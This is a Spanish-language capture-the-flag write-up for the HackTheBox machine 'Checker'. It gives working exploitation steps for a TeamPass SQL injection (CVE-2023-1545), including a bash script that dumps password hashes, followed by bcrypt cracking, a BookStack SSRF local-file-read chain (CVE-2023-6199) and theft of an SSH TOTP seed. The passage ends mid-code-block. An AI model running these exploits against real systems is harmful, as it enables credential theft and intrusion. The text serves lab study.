---
title: Checker - Hard (HTB)
permalink: /Checker-HTB-Writeup/
tags:
  - "Linux"
  - "Hard"
  - "TeamPass"
  - "SQL Injection"
  - "CVE-2023-1545"
  - "Hash Cracking"
  - "BookStack"
  - "CVE-2023-6199"
  - "SSRF"
  - "SSH 2FA"
  - "OTP Secrets"
  - "Sudoers"
  - "Ghidra"
  - "Race Condition"
  - "Command Injection"
categories:
  - writeup
  - hacking
  - hackthebox
  - "hacking web"
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
  - docs
seo_tittle: Checker - Hard (HTB)
seo_description: Practica explotación de CVEs, abusa de TOTP para autenticarte en SSH con 2FA y explota Race Condition para vencer Checker.
excerpt: Practica explotación de CVEs, abusa de TOTP para autenticarte en SSH con 2FA y explota Race Condition para vencer Checker.
header:
  overlay_image: /assets/images/headers/checker-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/checker-hackthebox.jpg
---


![image-center](/assets/images/posts/checker-hackthebox.png)
{: .align-center}

**Habilidades:** `TeamPass` 3.0.0.21 SQL Injection (CVE-2023-1545), Hash Cracking, `BookStack` Local File Read via Blind SSRF (CVE-2023-6199), Abusing SSH 2FA - Stealing OTP Secret Seed, Abusing Sudoers Privileges - Custom Script, Binary Analysis with `ghidra`, Exploiting Race Condition (Shared Memory) + Command Injection [Privilege Escalation] 
{: .notice--primary}

# Introducción

Checker es una máquina Linux de dificultad `Hard` en HackTheBox donde debemos comprometer diversos servicios web a través de la explotación de algunos CVEs. El acceso inicial lo lograremos a través del abuso de TOTP (Time-Based One Time Passwords) para iniciar sesión por SSH con 2FA. Explotaremos `Race Condition` y `Command Injection` a través de un binario vulnerable para ganar acceso privilegiado y vencer Checker.
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c 1 10.10.11.56                                                                                      
PING 10.10.11.56 (10.10.11.56) 56(84) bytes of data.
64 bytes from 10.10.11.56: icmp_seq=1 ttl=63 time=476 ms

--- 10.10.11.56 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 476.015/476.015/476.015/0.000 ms
~~~


## Nmap Scanning 

Comenzaremos escaneando puertos en la máquina víctima. Primeramente sólo nos interesa ver puertos abiertos usando el protocolo TCP, si no encontráramos gran cosa, probaríamos otros protocolos

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.56 -oG openPorts                                                          
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-31 09:35 EDT
Nmap scan report for 10.10.11.56
Host is up (0.46s latency).
Not shown: 62462 closed tcp ports (reset), 3070 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 20.39 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Haremos un segundo escaneo más exhaustivo a los puertos que hemos descubierto con el fin de identificar la versión y servicio que se ejecuta 

~~~ bash
nmap -p 22,80,8080 -sVC 10.10.11.56 -oN services Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-31 09:41 EDT
Nmap scan report for 10.10.11.56
Host is up (0.46s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 aa:54:07:41:98:b8:11:b0:78:45:f1:ca:8c:5a:94:2e (ECDSA)
|_  256 8f:2b:f3:22:1e:74:3b:ee:8b:40:17:6c:6c:b1:93:9c (ED25519)
80/tcp   open  http    Apache httpd
|_http-server-header: Apache
|_http-title: 403 Forbidden
8080/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: 403 Forbidden
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.10 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal


## Web Analysis - `Bookstack`

Vemos el puerto `80` abierto, si navegamos hasta la web el servidor nos intenta redirigir a `checker.htb` 

![image-center](/assets/images/posts/checker-bookstack-analysis.png)

Agregaremos este dominio a nuestro archivo `/etc/hosts` para poder resolver este nombre de dominio

~~~ bash
echo '10.10.11.56 checker.htb' | sudo tee -a /etc/hosts 
10.10.11.56 checker.htb
~~~

Si ahora volvemos a intentar navegar, llegaremos a la siguiente web, donde podemos iniciar sesión

![image-center](/assets/images/posts/checker-bookstack-analysis-2.png)

Si hacemos un escaneo a las tecnologías web desde consola, necesitaremos contemplar cambiar el `User-Agent` en algunas herramientas, ya que parece ser que bloquea algunos valores

![image-center](/assets/images/posts/checker-bookstack-analysis-3.png)

Gracias a `wappalyzer` y además a nuestro ojo de halcón, podemos notar que la web trabaja con la tecnología `BookStack`.

En cuanto a la versión, podemos fácilmente detectarla realizando una solicitud HTTP o viendo el código fuente, veremos dos recursos que contienen la palabra `version` y el mismo valor. Por lo que podemos deducir que este valor es la versión de `BookStack`

~~~ bash
curl -s http://checker.htb/login | grep version
    <link rel="stylesheet" href="http://checker.htb/dist/styles.css?version=v23.10.2">
                <script src="http://checker.htb/dist/app.js?version=v23.10.2" nonce="WoRCxOJl4dT1K8wTZGH4Sl51"></script>
~~~

Aparentemente esta versión es vulnerable a [CVE-2023-6199](https://nvd.nist.gov/vuln/detail/CVE-2023-6199). Sin embargo, el requisito principal es estar autenticados, por lo que podemos considerar un intento de explotar esto más adelante. Podemos ver documentación más técnica en el siguiente enlace

``` text
https://fluidattacks.com/blog/lfr-via-blind-ssrf-book-stack?utm_source=mailing&utm_medium=activecampaign&utm_campaign=blognov22
```


## Web Analysis - `Teampass`

Recordemos que no hemos enumerado el puerto `8080`, si navegamos a él, podremos ver la siguiente web donde podemos iniciar sesión

![image-center](/assets/images/posts/checker-teampass-analysis.png)


## (Failed) Fuzzing

Aquí es cuando se empieza a complicar la enumeración, si intentamos hacer `fuzzing` con herramientas como `gobuster`, debemos aplicar el cambio de `User-Agent`, esto lo podemos lograr con el parámetro `--random-agent`. Sin embargo, el servidor al cabo de unos momentos comenzará a retornar códigos de estado HTTP `429`

> El código de estado HTTP 429 significa "**Demasiadas solicitudes**" (Too Many Requests). Esto indica que el cliente ha enviado demasiadas solicitudes a un servidor dentro de un período de tiempo específico
{: .notice--danger}

~~~ bash
gobuster dir -u http://checker.htb:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 20 --random-agent
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://checker.htb:8080/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.5) Gecko/2008122406 Gentoo Firefox/3.0.5
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 301) [Size: 237] [--> http://checker.htb:8080/docs/]
/files                (Status: 301) [Size: 238] [--> http://checker.htb:8080/files/]
/30                   (Status: 429) [Size: 227]
/legal                (Status: 429) [Size: 227]
/banners              (Status: 429) [Size: 227]
~~~

Logramos descubrir una ruta `docs` antes de que el servidor bloqueara nuestras solicitudes, al navegar hasta allí, encontraremos la siguiente web, que consiste en la documentación de `Teampass`

![image-center](/assets/images/posts/checker-teampass-analysis-2.png)

Si clicamos el botón `Github`, podremos ver la estructura del proyecto, encontrando archivos comunes, como `docker-compose.yml` o `readme.md`, entre otros

![image-center](/assets/images/posts/checker-github-repo-teampass.png)

Volveremos a la máquina víctima para visitar el archivo `changelog.txt`, notaremos que no se especifica la versión, pero el `copyright` contempla hasta el año `2022`

~~~ bash
/*
 * Teampass - a collaborative passwords manager.
 * ---
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 * ---
 * @project   Teampass
 * @version   
 * @file      changelog.txt
 * ---
 * @author    Nils LaumaillÃ© (nils@teampass.net)
 * @copyright 2009-2022 Teampass.net
 * @license   https://spdx.org/licenses/GPL-3.0-only.html#licenseText GPL-3.0
 * ---
 * @see       https://www.teampass.net
 */
~~~

Es posible ver cuál versión fue la última en tener este apartado en el siguiente enlace donde vemos el historial de `commits` del archivo

- https://github.com/nilsteampassnet/TeamPass/commits/master/changelog.txt

![image-center](/assets/images/posts/checker-teampass-github-repo-2.png)

Esto no es del todo preciso pero notaremos que corresponde a la versión `3.0.0.20`
<br>


# Intrusión / Explotación
---
## `TeamPass` 3.0.0.21 SQL Injection (CVE-2023-1545)

La versión de `TeamPass` que se ejecuta en la máquina víctima es vulnerable a inyección SQL a través de una inyección en el endpoint `/authorize`. Esto nos permitiría obtener hashes de contraseñas de los usuarios existentes en la base de datos del servicio

### Understanding Injection 

La inyección se logra al usar una consulta `UNION` para escapar de la query original, que más o menos puede verse de la siguiente manera

~~~ sql
SELECT * FROM teampass_users WHERE login = 'username' AND pw = 'password'
~~~ 

La consulta que utilizaremos extrae datos de la tabla `teampass_users`, concretamente de la siguiente manera

~~~ bash
none' UNION SELECT id, '$hash', ($sqli_payload), private_key, personal_folder, fonction_id, groupes_visibles, groupes_interdits, 'foo' FROM teampass_users WHERE login='admin
~~~

Cerramos la consulta con `none '`, para después hacer uso de `UNION SELECT` y así enviar una consulta con una estructura determinada. Es en la variable `sql_payload` dentro de los paréntesis `()` donde usaremos nuestra query que extraiga datos de los usuarios.

~~~ bash
# Nombres de usuarios
SELECT login FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT $i,1

# Contraseñas hasheadas
SELECT pw FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT $i,1
~~~

Necesitamos enviar un hash que no necesariamente debe representar un valor válido, pero si debe ser el formato requerido por `TeamPass` para ser procesado (`bcrypt`)

~~~ sql
$2y$10$u5S27wYJCVbaPTRiHRsx7.iImx/WxRA8/tKvWdaWQ/iDuKlIkMbhq
~~~

Para entenderlo mejor, veremos cómo se envían los datos en una solicitud HTTP maliciosa

~~~ bash
POST /api/index.php/authorize HTTP/1.1
Host: checker.htb:8080
User-Agent: curl/8.10.1
Accept: */*
Content-Type: application/json
Content-Length: 340
Connection: keep-alive


{"login":"none' UNION SELECT id, '$2y$10$u5S27wYJCVbaPTRiHRsx7.iImx/WxRA8/tKvWdaWQ/iDuKlIkMbhq', (SELECT login FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT 0,1), private_key, personal_folder, fonction_id, groupes_visibles, groupes_interdits, 'foo' FROM teampass_users WHERE login='admin","password":"h4ck3d", "apikey": "foo"}
~~~

Estamos enviando un JSON con los atributos que mencionamos, donde podemos notar que dentro de los paréntesis `()` estamos consultando datos de los usuarios de la tabla `teampass_users`. El servidor responde con un JSON Web Token (JWT), como el siguiente

~~~ bash
HTTP/1.1 200 OK
Date: Sat, 31 May 2025 17:54:33 GMT
Server: Apache
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: POST
Access-Control-Max-Age: 3600
Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With
Cache-Control: no-store, no-cache, must-revalidate
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Content-Length: 592
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json


{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im5vbmUnIFVOSU9OIFNFTEVDVCBpZCwgJyQyeSQxMCR1NVMyN3dZSkNWYmFQVFJpSFJzeDcuaUlteFwvV3hSQThcL3RLdldkYVdRXC9pRHVLbElrTWJocScsIChTRUxFQ1QgcHcgRlJPTSB0ZWFtcGFzc191c2VycyBXSEVSRSBwdyAhPSAnJyBPUkRFUiBCWSBsb2dpbiBBU0MgTElNSVQgMCwxKSwgcHJpdmF0ZV9rZXksIHBlcnNvbmFsX2ZvbGRlciwgZm9uY3Rpb25faWQsIGdyb3VwZXNfdmlzaWJsZXMsIGdyb3VwZXNfaW50ZXJkaXRzLCAnZm9vJyBGUk9NIHRlYW1wYXNzX3VzZXJzIFdIRVJFIGxvZ2luPSdhZG1pbiIsImlkIjoxLCJleHAiOjE3NDg3MTkzNjEsInB1YmxpY19rZXkiOiIkMnkkMTAkbEtDYWUwRUlVTmo2Zjk2Wm5McW5DLkxiV3FyQlFDVDFMdUhFRmh0NlBtRTR5SDc1cnBXeWEiLCJwcml2YXRlX2tleSI6IiIsInBmX2VuYWJsZWQiOjAsImZvbGRlcnNfbGlzdCI6IiJ9.z7kSY8guoGHX6VTSYRwauAR1L3AR67bn7F5qyUciTJ4"}
~~~

Recordemos que la estructura de un JWT se compone de `3` partes fundamentales

~~~ json
header.payload.singature
~~~

Los datos que volcamos se verán reflejados en el `payload` del JWT, decodificaremos el valor `payload` de la respuesta del servidor en `base64`, entonces veremos lo siguiente

~~~ bash
echo eyJ1c2VybmFtZSI6Im5vbmUnIFVOSU9OIFNFTEVDVCBpZCwgJyQyeSQxMCR1NVMyN3dZSkNWYmFQVFJpSFJzeDcuaUlteFwvV3hSQThcL3RLdldkYVdRXC9pRHVLbElrTWJocScsIChTRUxFQ1QgcHcgRlJPTSB0ZWFtcGFzc191c2VycyBXSEVSRSBwdyAhPSAnJyBPUkRFUiBCWSBsb2dpbiBBU0MgTElNSVQgMCwxKSwgcHJpdmF0ZV9rZXksIHBlcnNvbmFsX2ZvbGRlciwgZm9uY3Rpb25faWQsIGdyb3VwZXNfdmlzaWJsZXMsIGdyb3VwZXNfaW50ZXJkaXRzLCAnZm9vJyBGUk9NIHRlYW1wYXNzX3VzZXJzIFdIRVJFIGxvZ2luPSdhZG1pbiIsImlkIjoxLCJleHAiOjE3NDg3MTkzNjEsInB1YmxpY19rZXkiOiIkMnkkMTAkbEtDYWUwRUlVTmo2Zjk2Wm5McW5DLkxiV3FyQlFDVDFMdUhFRmh0NlBtRTR5SDc1cnBXeWEiLCJwcml2YXRlX2tleSI6IiIsInBmX2VuYWJsZWQiOjAsImZvbGRlcnNfbGlzdCI6IiJ9 | base64 -d | jq

{
  "username": "none' UNION SELECT id, '$2y$10$u5S27wYJCVbaPTRiHRsx7.iImx/WxRA8/tKvWdaWQ/iDuKlIkMbhq', (SELECT pw FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT 0,1), private_key, personal_folder, fonction_id, groupes_visibles, groupes_interdits, 'foo' FROM teampass_users WHERE login='admin",
  "id": 1,
  "exp": 1748719361,
  "public_key": "$2y$10$lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya",
  "private_key": "",
  "pf_enabled": 0,
  "folders_list": ""
}
~~~

### Proof of Concept - Bash Script 

Podemos encontrar detalles de esta vulnerabilidad además de un script en `bash` que hace lo que mencionamos anteriormente

- https://huntr.com/bounties/942c015f-7486-49b1-94ae-b1538d812bc2

~~~ bash
if [ "$#" -lt 1 ]; then
  echo "Usage: $0 <base-url>"
  exit 1
fi

vulnerable_url="$1/api/index.php/authorize"

check=$(curl -s "$vulnerable_url")
if echo "$check" | grep -q "API usage is not allowed"; then
  echo "API feature is not enabled :-("
  exit 1
fi

# htpasswd -bnBC 10 "" h4ck3d | tr -d ':\n'
arbitrary_hash='$2y$10$u5S27wYJCVbaPTRiHRsx7.iImx/WxRA8/tKvWdaWQ/iDuKlIkMbhq'

exec_sql() {
  inject="none' UNION SELECT id, '$arbitrary_hash', ($1), private_key, personal_folder, fonction_id, groupes_visibles, groupes_interdits, 'foo' FROM tea>
  data="{\"login\":\""$inject\"",\"password\":\"h4ck3d\", \"apikey\": \"foo\"}"
  token=$(curl -s -H "Content-Type: application/json" -X POST -d "$data" "$vulnerable_url" | jq -r '.token')
  echo $(echo $token| cut -d"." -f2 | base64 -d 2>/dev/null | jq -r '.public_key')
}

users=$(exec_sql "SELECT COUNT(*) FROM teampass_users WHERE pw != ''")

echo "There are $users users in the system:"

for i in `seq 0 $(($users-1))`; do
  username=$(exec_sql "SELECT login FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT $i,1")
  password=$(exec_sql "SELECT pw FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT $i,1")
  echo "$username: $password"
done
~~~

### Exploiting

Ejecutaremos el script con `bash` enviando la URL de `TeamPass`, en este caso ha encontrado dos usuarios, `admin` y `bob`

~~~ bash
bash exploit.sh http://checker.htb:8080
There are 2 users in the system:
admin: $2y$10$lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya
bob: $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy
~~~


## Hash Cracking

Guardaremos el hash de `bob` en un archivo `hashes.txt` (porque es el crackeable), e intentaremos ver si las contraseñas son débiles con un ataque de fuerza bruta

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt --format=bcrypt
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cheerleader      (?)     
1g 0:00:00:05 DONE (2025-05-31 15:34) 0.1686g/s 139.6p/s 139.6c/s 139.6C/s caitlin..yamaha
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
~~~


## `TeamPass` - Login as `bob`

Hemos encontrado la contraseña `cheerleader` para el usuario `bob`, lógicamente podremos iniciar sesión en el panel de `TeamPass`

![image-center](/assets/images/posts/checker-teampass-as-bob.png)

Dentro del `dashboard` veremos una carpeta `bob-access`, donde vemos dos ítems: `bookstack login` y `ssh-access`

![image-center](/assets/images/posts/checker-teampass-as-bob-2.png)

Podemos copiar la contraseña al hacer **clic para ver la contraseña e inmediatamente después haciendo clic en copiar**

~~~ text
bob:hiccup-publicly-genesis
~~~


## (Failed) Shell as `reader` - SSH Multi-Factor Authentication

Si intentamos ingresar por `ssh`, parece ser que se usa MFA (`Multi-Factor Authentication`), necesitamos un código de verificación, el cual no tenemos

~~~ bash
ssh reader@checker.htb 
(reader@checker.htb) Password: 
(reader@checker.htb) Verification code: 
(reader@checker.htb) Password: 
~~~ 

Probaremos la otra contraseña `bookstack login`, la podemos copiar igualmente que la anterior

![image-center](/assets/images/posts/checker-teampass-as-bob-3.png)

~~~ text
bob:mYSeCr3T_w1kI_P4sSw0rD
~~~

Como el nombre nos indica, podremos iniciar sesión en `BookStack` como el usuario `bob`, sólo que ahora debemos ingresar con su `email`

![image-center](/assets/images/posts/checker-bookstack-as-bob.png)


## `BookStack` Local File Read via Blind SSRF (CVE-2023-6199)

Recordemos que esta versión de `BookStack` podría ser vulnerable a Server Side Request Forgery, donde a través de la manipulación de solicitudes HTTP podemos hacer que el servidor realice solicitudes según definamos, podemos ver una prueba de concepto en el siguiente enlace:

- https://fluidattacks.com/advisories/imagination

Para poder replicar la prueba de concepto, crearemos un nuevo libro haciendo clic en `Books` > `Create New Book`, llegaremos a la siguiente web

![image-center](/assets/images/posts/checker-bookstack-as-bob-2.png)

En mi caso he creado un libro con el título `pwned`, el nombre no importa, el contenido tampoco

![image-center](/assets/images/posts/checker-bookstack-as-bob-3.png)

Al intentar crear una nueva página del libro se abre el editor, estaremos interceptando las solicitudes HTTP al momento de guardar cambios haciendo clic en `Save Draft`

> Recuerda que debes tener el proxy HTTP a la escucha y el navegador configurado para pasar el tráfico HTTP por el proxy, en mi caso usaré `Burpsuite`
{: .notice--warning} 

![image-center](/assets/images/posts/checker-bookstack-as-bob-4.png)

### Server Side Request Forgery - Proof of Concept

Los datos que enviamos al interceptar lucen de la siguiente manera, estamos enviando un párrafo en formato de etiquetas HTML (`<p>`)

~~~ bash
{"name":"Test","html":"<p>test</p>"}
~~~

Ahora si intentamos usar una etiqueta `img`, de forma que intente encontrar el recurso en nuestra máquina, veremos que el servidor nos envía una solicitud HTTP. Primero debemos enviar la etiqueta con la siguiente sintaxis

~~~ bash
<img src='data:image/png;base64,[BASE64_HERE]'/>
~~~

Hacemos referencia a un recurso de nuestra máquina usando un servidor HTTP

~~~ bash
echo -n 'http://10.10.14.62/test' | base64
aHR0cDovLzEwLjEwLjE0LjYyL3Rlc3Q=

# Levantamos un Servidor HTTP
python3 -m http.server 80
~~~

La solicitud modificada ahora debería verse de la siguiente manera, donde solamente cambiamos el valor del campo `html` para insertar la supuesta imagen

![image-center](/assets/images/posts/checker-burp.png)

En nuestro servidor HTTP veremos que la máquina víctima ha realizado una solicitud al recurso `test`

~~~ bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.56 - - [31/May/2025 18:22:09] code 404, message File not found
10.10.11.56 - - [31/May/2025 18:22:09] "GET /test HTTP/1.1" 404 -
~~~

### PHP Filters Chain Oracle - Exploiting

Por el momento no podemos hacer que el servidor ejecute comandos directamente. Sin embargo, podemos intentar leer archivos 

- https://github.com/synacktiv/php_filter_chains_oracle_exploit

~~~ bash
git clone https://github.com/synacktiv/php_filter_chains_oracle_exploit
cd php_filter_chains_oracle_exploit
vim ./filters_chain_oracle/core/requestor.py
~~~

Modificaremos el exploit para que la cadena de `wrappers` se envíe en `base64` tal y como lo probamos anteriormente. Agregaremos el `import` en las primeras líneas además de **agregar la línea `109` definiendo la etiqueta `<img>`**.

Si consultamos las líneas que nos interesan usando el `cat` con esteroides `batcat`, deberían verse de la siguiente forma

~~~ bash
batcat -r 1 -r 108:109 filters_chain_oracle/core/requestor.py -p 

from base64 import b64encode
        filter_chain = f'php://filter/{s}{self.in_chain}/resource={self.file_to_leak}'
        filter_chain = f"<img src='data:image/png;base64,{b64encode(filter_chain.encode()).decode()}' />"
~~~

Ejecutaremos el exploit, en mi caso usaré Burpsuite para entender lo que estamos enviando

> Puedes omitir el parámetro `--proxy http://localhost:8080`

~~~ bash
python3 filters_chain_oracle_exploit.py --target http://checker.htb/ajax/page/8/save-draft --verb PUT --headers '{"X-CSRF-TOKEN":"W9Ee3nFIcCVTXjcphZOekIf8jIAGoY8p5b657idG", "Cookie": "teampass_session=csbar4fdb0enha24p4a7be8pi2; jstree_select=1; XSRF-TOKEN=eyJpdiI6ImF5MlZjZWFjNHYza3I0ZnZpSnBBa1E9PSIsInZhbHVlIjoiUGc1ZTl5b2U2djlkTnA5bXVZM1oxaHdNM2lRUE1UTXZTY1FpM2t0dTR1TlVYV3dYdkNMT3YvVVg1dFFWZEdueXBPRytkMmpUZ1Y1dDAwakpaMjltbWhnN2UrU0VZdG9HMDM2NDZJaFU1eXo5c0gzTkl3Zkp1RjNkUzg2dFFDSDEiLCJtYWMiOiIxNzBmOTJiNDdjMDhkZDRlN2VkMzUzYjUzNzY1NDljYzZhNjBkOWU5OWUwM2ZhMzc4YjZjNzI5NmYyMDY5ZGRiIiwidGFnIjoiIn0%3D; bookstack_session=eyJpdiI6IklBVlY3M3M5djhreFpXclBQVzN6UlE9PSIsInZhbHVlIjoiQWJyak5ab3MvaHFiVUpjSk95ajJpTUhtZHFtZFFlMVFyTTIrVTBXSkd5ZVN1SWs0cE8xblVSRlAwa21OaldzNGxJemVlbUFiMk9JTHdEM0VXVXlJNCtLMkNjMDRHVHBZN3lWQ3d6SzZMeldMaFhZNXVSZ01WNXFoaHUvSXdzbGsiLCJtYWMiOiI3YTliNWEwOTFmMWQ4NzQ3YTIzM2NjYmFjOGRhNWU4ZGZhYjM1NjRlNGVlNGE4ZTkxMGZiZjJlODExNTJhODY0IiwidGFnIjoiIn0%3D"}' --parameter html --file /etc/hostname

[*] The following URL is targeted : http://checker.htb/ajax/page/8/save-draft
[*] The following local file is leaked : /etc/hostname
[*] Running PUT requests
[*] Additionnal headers used : {"X-CSRF-TOKEN":"W9Ee3nFIcCVTXjcphZOekIf8jIAGoY8p5b657idG", "Cookie": "teampass_session=csbar4fdb0enha24p4a7be8pi2; jstree_select=1; XSRF-TOKEN=eyJpdiI6ImF5MlZjZWFjNHYza3I0ZnZpSnBBa1E9PSIsInZhbHVlIjoiUGc1ZTl5b2U2djlkTnA5bXVZM1oxaHdNM2lRUE1UTXZTY1FpM2t0dTR1TlVYV3dYdkNMT3YvVVg1dFFWZEdueXBPRytkMmpUZ1Y1dDAwakpaMjltbWhnN2UrU0VZdG9HMDM2NDZJaFU1eXo5c0gzTkl3Zkp1RjNkUzg2dFFDSDEiLCJtYWMiOiIxNzBmOTJiNDdjMDhkZDRlN2VkMzUzYjUzNzY1NDljYzZhNjBkOWU5OWUwM2ZhMzc4YjZjNzI5NmYyMDY5ZGRiIiwidGFnIjoiIn0%3D; bookstack_session=eyJpdiI6IklBVlY3M3M5djhreFpXclBQVzN6UlE9PSIsInZhbHVlIjoiQWJyak5ab3MvaHFiVUpjSk95ajJpTUhtZHFtZFFlMVFyTTIrVTBXSkd5ZVN1SWs0cE8xblVSRlAwa21OaldzNGxJemVlbUFiMk9JTHdEM0VXVXlJNCtLMkNjMDRHVHBZN3lWQ3d6SzZMeldMaFhZNXVSZ01WNXFoaHUvSXdzbGsiLCJtYWMiOiI3YTliNWEwOTFmMWQ4NzQ3YTIzM2NjYmFjOGRhNWU4ZGZhYjM1NjRlNGVlNGE4ZTkxMGZiZjJlODExNTJhODY0IiwidGFnIjoiIn0%3D"}
[+] File /etc/hostname leak is finished!
Y2hlY2tl
b'checke'
~~~

Las solicitudes HTTP que enviamos se ven ligeramente diferentes, donde se modifica el contenido para enviarlo en formato `x-www-form-urlencoded`

![image-center](/assets/images/posts/checker-burp-2.png)

El contenido que viaja en `base64` dentro de la etiqueta `img` corresponde a la cadena de `wrappers` PHP

~~~ bash
echo -n cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZXx8ZGVjaHVua3xjb252ZXJ0Lmljb252LkwxLlVDUy00fGNvbnZlcnQuaWNvbnYuTDEuVUNTLTR8Y29udmVydC5pY29udi5MMS5VQ1MtNHxjb252ZXJ0Lmljb252LkwxLlVDUy00fGNvbnZlcnQuaWNvbnYuTDEuVUNTLTR8Y29udmVydC5pY29udi5MMS5VQ1MtNHxjb252 | base64 -d; echo

php://filter/convert.base64-encode||dechunk|convert.iconv.L1.UCS-4|convert.iconv.L1.UCS-4|convert.iconv.L1.UCS-4|convert.iconv.L1.UCS-4|convert.iconv.L1.UCS-4|convert.iconv.L1.UCS-4|conv
~~~

### Finding More Info

Podemos ver más información en el libro de ejemplo `Basic backup with cp`, donde se nos muestra un ejemplo de uso, y vemos que se usa una ruta `/backup/home_backup`

~~~ text
http://checker.htb/books/linux-security/page/basic-backup-with-cp
~~~

![image-center](/assets/images/posts/checker-bookstack-as-bob-5.png)


## SSH Two-Factor Authentication

Recordemos el mensaje que veíamos al intentar iniciar sesión por `ssh` como el usuario `reader`

~~~ bash
ssh reader@checker.htb 
(reader@checker.htb) Password: 
(reader@checker.htb) Verification code: 
(reader@checker.htb) Password:
~~~

### Understanding 2FA Flow

Cuando iniciamos sesión a través de SSH con 2FA configurado, necesitamos usar un código verificador además de la contraseña, este código integra una capa extra de seguridad para evitar ataques como `password spraying` o reutilización de credenciales, los componentes principales serían los siguientes:

- `OTP (One Time Password)`: Código de un solo uso, generado con un algoritmo estándar (`TOTP` o `HOTP`)
- `TOTP (Time-Based One Time Password)`: Estándar `RFC 6238` que combina una `Secret Seed` + `timestamp` para generar códigos que expiran cada `30-60` segundos 
- `Secret Seed`: Clave maestra en formato `base32`
	- Esta semilla reside comúnmente dentro de la ruta `/home/user/.google_authenticator`
	- Es la base criptográfica utilizada para generar OTPs sincronizados entre el servidor y una app de 2FA (por ejemplo, `Google Authenticator`) 

En sistemas Linux es común utilizar el servicio `Google Authenticator`, que soporta este algoritmo, además de contar con un módulo PAM para este sistema operativo


## Stealing OTP Secret Seed

Como ya conocemos los conceptos necesarios para poder autenticarnos, es necesario robar la semilla para generar códigos TOTP por nuestra cuenta y así poder autenticarnos como `reader` por `ssh`.

Si ejecutamos el exploit para buscar este archivo directamente en el directorio `/home/reader`, veremos el siguiente error 

~~~ bash
[-] File /home/reader/.google_authenticator is either empty, or the exploit did not work :(
~~~

Esto nos indica tanto que o estamos usando incorrectamente el exploit o que este archivo no existe, o **no tenemos los permisos de lectura**. Es por eso que usaremos la ruta `/backup/home_backup` que vimos antes para buscar el código dentro

~~~ bash
